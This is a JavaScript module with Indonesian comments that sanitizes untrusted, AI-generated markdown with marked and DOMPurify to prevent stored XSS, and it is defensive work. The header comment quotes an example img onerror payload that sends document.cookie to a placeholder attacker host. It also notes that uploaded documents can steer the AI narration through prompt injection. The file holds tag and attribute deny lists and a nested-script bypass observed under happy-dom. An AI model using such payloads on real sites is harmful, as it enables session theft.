/**
 * ============================================================
 *  SAFE MARKDOWN — render markdown dari sumber TIDAK TERPERCAYA
 *
 *  KENAPA INI ADA
 *  --------------
 *  Proyek ini menampilkan narasi yang dihasilkan AI (`narasi_teknis`,
 *  `narasi` laporan) dengan `marked.parse(...)` lalu menyuntikkannya
 *  lewat template `${...}` ke dalam `innerHTML`.
 *
 *  Sejak marked v5+, opsi `sanitize` bawaan DIHAPUS. Artinya HTML apa pun
 *  di dalam markdown akan diteruskan apa adanya — termasuk:
 *
 *      <img src=x onerror="fetch('https://jahat.example/?c='+document.cookie)">
 *
 *  Narasi AI tidak bisa dipercaya begitu saja: isinya dipengaruhi oleh
 *  dokumen yang diunggah pengguna (OCR, DOCX, PDF) melalui prompt injection.
 *  Jadi jalur ini adalah XSS tersimpan (stored XSS).
 *
 *  PEMAKAIAN
 *  ---------
 *      import { safeMarkdown } from '../lib/safe-markdown.js';
 *      html = safeMarkdown(aiOutput);          // aman
 *
 *  Untuk konten yang memang perlu tag tertentu (mis. tabel laporan),
 *  gunakan opsi `profile`.
 * ============================================================
 *
 * @module lib/safe-markdown
 */

import { marked } from 'marked';
import DOMPurify from 'dompurify';

/** Konfigurasi marked yang konsisten (GFM, line break seperti GitHub). */
marked.setOptions({
  gfm: true,
  breaks: true,
  headerIds: false,   // hindari id yang bisa menimpa elemen lain
  mangle: false,
});

/**
 * Profil sanitasi.
 * - `narration` (default): untuk narasi AI & laporan. Tag tabel & judul
 *   diizinkan karena laporan memakainya, tetapi atribut berbahaya dibuang.
 * - `strict`: hanya format teks (untuk komentar pengguna, chat).
 */
const PROFILES = {
  narration: {
    ALLOWED_TAGS: [
      'p', 'br', 'hr', 'strong', 'b', 'em', 'i', 'u', 's', 'del',
      'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'a', 'span', 'sub', 'sup',
      // '#text' HARUS didaftarkan eksplisit: DOMPurify hanya menambahkan
      // node teks ke allow-list saat KEEP_CONTENT = true. Tanpa ini,
      // mematikan KEEP_CONTENT akan menghapus SELURUH teks (paragraf jadi kosong).
      '#text',
    ],
    ALLOWED_ATTR: ['href', 'title', 'class', 'colspan', 'rowspan'],
    ALLOW_DATA_ATTR: false,
  },
  strict: {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'b', 'em', 'i', 'code', 'pre', 'ul', 'ol', 'li', 'blockquote', '#text'],
    ALLOWED_ATTR: [],
    ALLOW_DATA_ATTR: false,
  },
};

/** Aturan umum yang berlaku untuk semua profil. */
const COMMON_RULES = {
  FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form', 'input', 'button',
    'select', 'textarea', 'svg', 'math', 'template', 'noscript', 'base', 'link', 'meta'],
  FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
    'formaction', 'srcdoc', 'xlink:href', 'xmlns'],
  // Cegah javascript:, data:, vbscript: pada href
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,

  /**
   * WAJIB false. Dengan nilai true (default DOMPurify), isi node yang dibuang
   * akan "dinaikkan" ke induknya dengan cara DI-CLONE lalu diandalkan pada
   * NodeIterator untuk memfilternya kembali.
   *
   * Pengujian di sandbox ini (16 Sep 2026) menunjukkan bahwa pada lingkungan
   * yang NodeIterator-nya tidak mengunjungi node hasil mutasi saat iterasi
   * berjalan — terbukti di happy-dom — payload BERSARANG LOLOS:
   *
   *     '<div><script>window.showToast(1, 'info')</script></div>'  →  '<script>window.showToast(1, 'info')</script>'
   *
   * Di jsdom (sesuai spesifikasi DOM) hasilnya benar ('<script>' dibuang),
   * jadi ini bukan celah DOMPurify di browser asli. Namun karena kegagalan
   * jenis ini SENYAP dan berujung XSS, lapisan ini dibuat tidak bergantung
   * pada perilaku iterator: KEEP_CONTENT dimatikan.
   *
   * Karena DOMPurify hanya memasukkan '#text' ke allow-list ketika
   * KEEP_CONTENT aktif, '#text' didaftarkan eksplisit di ALLOWED_TAGS.
   * Tanpa itu, mematikan KEEP_CONTENT membuat SEMUA teks hilang
   * (paragraf menjadi kosong) — sudah dibuktikan lewat pengujian.
   *
   * Konsekuensi: teks di dalam tag yang tidak diizinkan ikut terbuang
   * (mis. '<div>teks</div>' → ''). Untuk markdown keluaran `marked`,
   * tag yang dipakai selalu ada di ALLOWED_TAGS, sehingga konten laporan
   * yang sah tidak ada yang hilang.
   */
  KEEP_CONTENT: false,
};

/**
 * Apakah DOMPurify tersedia (butuh DOM; di Node/tes bisa tidak ada).
 */
function purifierAvailable() {
  return typeof DOMPurify?.sanitize === 'function';
}

/**
 * Escape HTML sederhana — dipakai sebagai fallback bila DOMPurify tidak ada.
 */
export function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Ubah markdown menjadi HTML yang AMAN disuntikkan lewat innerHTML.
 *
 * @param {string} md teks markdown (boleh dari AI / unggahan pengguna)
 * @param {{profile?: 'narration'|'strict'}} [options]
 * @returns {string} HTML yang sudah disanitasi
 */
export function safeMarkdown(md, options = {}) {
  if (md === null || md === undefined || md === '') return '';

  const { profile = 'narration' } = options;
  const raw = typeof md === 'string' ? md : String(md);

  let html;
  try {
    html = marked.parse(raw);
  } catch (err) {
    // Markdown rusak → jangan gagal total, tampilkan sebagai teks biasa
    console.warn('[safeMarkdown] marked gagal, memakai teks polos:', err?.message);
    return escapeHtml(raw);
  }

  if (!purifierAvailable()) {
    // Tanpa DOMPurify, lebih baik kehilangan format daripada membuka XSS
    console.warn('[safeMarkdown] DOMPurify tidak tersedia — output di-escape total.');
    return escapeHtml(raw);
  }

  return DOMPurify.sanitize(html, {
    ...PROFILES[profile],
    ...COMMON_RULES,
  });
}

/**
 * Sanitasi HTML yang sudah jadi (bukan markdown) — mis. hasil template
 * yang memuat data pengguna.
 *
 * @param {string} html
 * @param {{profile?: 'narration'|'strict'}} [options]
 */
export function safeHtml(html, options = {}) {
  if (!html) return '';
  if (!purifierAvailable()) return escapeHtml(html);
  const { profile = 'narration' } = options;
  return DOMPurify.sanitize(String(html), {
    ...PROFILES[profile],
    ...COMMON_RULES,
  });
}

export default safeMarkdown;
